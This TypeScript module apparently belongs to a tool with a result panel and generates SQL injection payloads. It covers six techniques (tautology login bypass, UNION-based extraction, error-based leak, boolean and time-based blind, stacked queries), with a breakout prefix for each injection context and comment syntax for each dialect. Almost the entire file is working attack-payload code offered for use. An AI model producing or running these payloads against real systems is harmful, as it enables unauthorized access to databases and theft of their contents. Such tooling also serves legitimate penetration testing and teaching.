import { SqliContext } from "./context";
import { SqlDialect } from "./dialects";

export type SqliLevel = "basic" | "intermediate" | "advanced";

export type SqliTechnique = {
  id: string;
  label: string;
  level: SqliLevel;
  contexts: SqliContext[];
  /** Human-readable description shown in the result panel. */
  technique: string;
  /** False for the basic tautology bypass, which doesn't extract data at all — the UI should note
   *  that info fields have no effect while a technique with this set to false is selected. */
  usesInfoExpr: boolean;
  /** Only the UNION-based technique consumes this — set true so the UI knows to show the
   *  column-count input for it. */
  columnCountAware?: boolean;
  /** Returns null when this technique has no reliable implementation on `dialect` at all (e.g.
   *  error-based leak on SQLite/Oracle, time-based blind on SQLite/Oracle, stacked queries on
   *  Oracle) — callers must fall back gracefully rather than emit a non-functional payload. */
  render: (dialect: SqlDialect, infoExpr: string | null, quote: string, context: SqliContext, columnCount: number) => string | null;
};

const ALL_CONTEXTS: SqliContext[] = ["numeric", "string", "search"];

/** The literal fragment that breaks out of the injection point before the injected SQL begins.
 *  Numeric parameters need no break at all; search (LIKE) parameters need the wildcard closed
 *  first. */
function breakout(context: SqliContext, quote: string): string {
  if (context === "numeric") return "";
  if (context === "search") return `%${quote}`;
  return quote;
}

export const SQLI_TECHNIQUES: SqliTechnique[] = [
  {
    id: "tautology",
    label: "Tautology (always-true bypass)",
    level: "basic",
    contexts: ALL_CONTEXTS,
    technique: "Boolean tautology that makes the surrounding WHERE clause always true — a classic auth-bypass payload, not a data-extraction one.",
    usesInfoExpr: false,
    render: (dialect, _infoExpr, quote, context) => {
      if (context === "numeric") return ` OR 1=1${dialect.lineComment}`;
      const b = breakout(context, quote);
      return `${b} OR ${quote}1${quote}=${quote}1${quote}${dialect.lineComment}`;
    },
  },
  {
    id: "union-select",
    label: "UNION-based SELECT",
    level: "intermediate",
    contexts: ALL_CONTEXTS,
    technique: "Appends a UNION SELECT to pull the chosen info directly into the page output.",
    usesInfoExpr: true,
    columnCountAware: true,
    render: (dialect, infoExpr, quote, context, columnCount) => {
      if (infoExpr === null) return null;
      const b = breakout(context, quote);
      const padCount = Math.max(0, columnCount - 1);
      const selectList = [...Array(padCount).fill("NULL"), infoExpr].join(",");
      return `${b} UNION SELECT ${selectList}${dialect.lineComment}`;
    },
  },
  {
    id: "error-based",
    label: "Error-based leak",
    level: "advanced",
    contexts: ALL_CONTEXTS,
    technique: "Forces the database to throw an error whose message contains the extracted value.",
    usesInfoExpr: true,
    render: (dialect, infoExpr, quote, context) => {
      if (infoExpr === null || dialect.errorTrigger === null) return null;
      const b = breakout(context, quote);
      return `${b} AND ${dialect.errorTrigger(infoExpr)}${dialect.lineComment}`;
    },
  },
  {
    id: "boolean-blind",
    label: "Boolean-based blind",
    level: "advanced",
    contexts: ALL_CONTEXTS,
    technique:
      "Tests a true/false condition against the extracted value, one comparison at a time — works even with no visible output. Only the first info field is used; chaining multiple fields only fully applies to UNION-based/error-based techniques.",
    usesInfoExpr: true,
    render: (dialect, infoExpr, quote, context) => {
      if (infoExpr === null) return null;
      const b = breakout(context, quote);
      return `${b} AND (${infoExpr}) IS NOT NULL${dialect.lineComment}`;
    },
  },
  {
    id: "time-based-blind",
    label: "Time-based blind",
    level: "advanced",
    contexts: ALL_CONTEXTS,
    technique: "Introduces a measurable delay when the condition is true — useful when no output or errors are visible at all.",
    usesInfoExpr: false,
    render: (dialect, _infoExpr, quote, context) => {
      if (dialect.inlineSleepCondition === null) return null;
      const b = breakout(context, quote);
      return `${b} AND ${dialect.inlineSleepCondition(5)}${dialect.lineComment}`;
    },
  },
  {
    id: "stacked-queries",
    label: "Stacked queries",
    level: "advanced",
    contexts: ALL_CONTEXTS,
    technique:
      "Appends a second statement after the original query. Only works if the vulnerable application's driver/API executes multi-statement queries — many block this by default, so this is less reliable than every other technique here.",
    usesInfoExpr: false,
    render: (dialect, _infoExpr, quote, context) => {
      if (!dialect.supportsStackedQueries || dialect.stackedSleepStatement === null) return null;
      const b = breakout(context, quote);
      return `${b}; ${dialect.stackedSleepStatement(5)}${dialect.lineComment}`;
    },
  },
];

export const SQLI_TECHNIQUES_BY_ID: Record<string, SqliTechnique> = Object.fromEntries(
  SQLI_TECHNIQUES.map((t) => [t.id, t]),
);
